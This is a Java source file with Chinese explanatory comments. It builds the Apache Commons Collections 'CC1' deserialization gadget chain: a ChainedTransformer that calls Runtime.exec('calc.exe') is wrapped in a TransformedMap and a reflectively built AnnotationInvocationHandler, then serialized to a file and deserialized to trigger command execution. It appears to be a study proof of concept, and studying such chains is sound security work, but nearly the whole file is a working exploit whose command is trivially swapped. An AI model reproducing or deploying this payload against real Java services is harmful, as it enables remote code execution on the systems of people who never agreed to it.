package CC1;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/*
AnnotationInvocationHandler#readObject() -> AbstractInputCheckedMapDecorator#setValue() ->
TransformedMap#checkSetValue() -> ChainedTransformer#transform() -> ConstantTransformer#transform()
-> InvokerTransformer#transform
 */


public class CC1_TransformedMap implements Serializable {
    public static void main(String[] args) throws Exception{
        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
        Transformer transformerChain = new ChainedTransformer(transformers);
        //Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
        Map map = new HashMap();
        map.put("value", "test");

        //Map数据结构，转换后的Map
        /*
        TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
            第一个参数为待转化的Map对象
            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
            第三个参数为Map对象内的value要经过的转化方法。
       */
        //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);
        Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

        //反射机制调用AnnotationInvocationHandler类的构造函数
        //forName 获得类名对应的Class对象
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射调用私有的的结构：私有方法、属性、构造器
        //指定构造器

        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制,保证构造器可访问
        ctor.setAccessible(true);

        //获取AnnotationInvocationHandler类实例
        //调用此构造器运行时类的对象
        Object instance=ctor.newInstance(Target.class, transformedMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("serialize.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(instance);
        objectOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("serialize.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Object result = objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(result);
    }
}